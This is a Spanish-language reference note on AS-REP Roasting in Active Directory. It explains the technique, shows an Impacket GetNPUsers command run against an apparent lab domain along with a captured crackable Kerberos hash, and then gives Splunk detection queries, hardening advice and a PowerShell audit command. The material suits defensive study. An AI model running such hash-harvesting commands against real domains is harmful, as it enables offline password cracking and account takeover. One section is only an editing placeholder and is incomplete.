# 🛑 AS-REP Roasting en Active Directory

---

## 📝 ¿Qué es AS-REP Roasting?

| Concepto      | Descripción                                                                                                   |
|---------------|--------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica que permite a un atacante solicitar tickets AS-REP Kerberos de cuentas con preautenticación deshabilitada y crackear los hashes offline. |
| **Requisito** | La cuenta objetivo debe tener deshabilitada la opción **"Do not require Kerberos preauthentication"**.        |

---

## 🛠️ ¿Cómo funciona el ataque?

| Fase             | Acción                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Enumeración**  | El atacante identifica cuentas vulnerables vía LDAP/AD.                                         |
| **Solicitud**    | Solicita AS-REP (AS-REQ sin preautenticación) al KDC para esas cuentas.                        |
| **Obtención**    | El KDC responde con el ticket cifrado con el hash de la contraseña de la cuenta.               |
| **Crackeo**      | El atacante extrae el hash y lo crackea offline (ej: Hashcat, John the Ripper).                |

---

## 💻 Ejemplo práctico

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py essos.local/daenerys.targaryen -request
```

```
Name       MemberOf  PasswordLastSet             LastLogon                   UAC      
---------  --------  --------------------------  --------------------------  --------
missandei            2025-02-26 09:30:35.437503  2025-05-23 07:05:19.141162  0x410200 

$krb5asrep$23$missandei@ESSOS.LOCAL:600c153e69bd4899e402b6d1aad05e4f$1c5e29ec6f2e26b7d3738f19108a0b9b03ffa7ce3480e02f885bafe0de2668d499f23b6b034be320ee03ba64e70f4f3171c5bd59c0afdd1d79e0f64fcc1d138...
```

---

## 📊 Detección en logs y SIEM

| Campo clave                   | Descripción                                           |
|-------------------------------|------------------------------------------------------|
| **EventCode = 4768**          | Solicitud de TGT (AS-REQ) en Kerberos.               |
| **Pre_Authentication_Type=0** | Sin preautenticación: señal de AS-REP Roasting.      |
| **Account_Name**              | Cuenta solicitada.                                   |
| **Client_Address**            | IP origen de la petición.                            |
| **Ticket_Encryption_Type**    | Tipo de cifrado (analítico).                         |

### Query Splunk básica

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=4768 Pre_Authentication_Type=0
| table _time, ComputerName, Account_Name, Client_Address, Ticket_Encryption_Type
```

---

## 🔎 Queries completas para más investigación

*(Mantén aquí todas las queries avanzadas de tu original, ya están muy bien y claras. Si quieres puedes añadir títulos más descriptivos a cada una).*

---

## 🦾 Hardening y mitigación

| Medida                                   | Descripción                                                                                  |
|-------------------------------------------|---------------------------------------------------------------------------------------------|
| **Activar preautenticación**              | Desactiva la opción **"No requerir preautenticación Kerberos"** en todas las cuentas.        |
| **Revisar cuentas sensibles**             | Verifica que cuentas privilegiadas y de servicio tengan preautenticación habilitada.         |
| **Contraseñas robustas**                  | Usa contraseñas largas y complejas, dificultando el crackeo offline.                        |
| **Monitorización**                        | Vigila eventos 4768 con Pre_Authentication_Type=0 y correlaciona IPs sospechosas.           |
| **Auditoría periódica**                   | Busca cuentas vulnerables a AS-REP Roasting periódicamente.                                 |
| **No exponer controladores de dominio**   | Mantén DCs y cuentas AD fuera de alcance de redes públicas/no confiables.                   |

---

## 🧑‍💻 ¿Cómo revisar o identificar la preautenticación de una cuenta?

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```
O revisa en la consola de Active Directory:  
Propiedades de usuario → Cuenta → Opciones de cuenta →  
**"No requerir preautenticación Kerberos"** (debe estar desmarcada).

---

## 📚 Referencias

- [AS-REP Roasting - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting)
- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
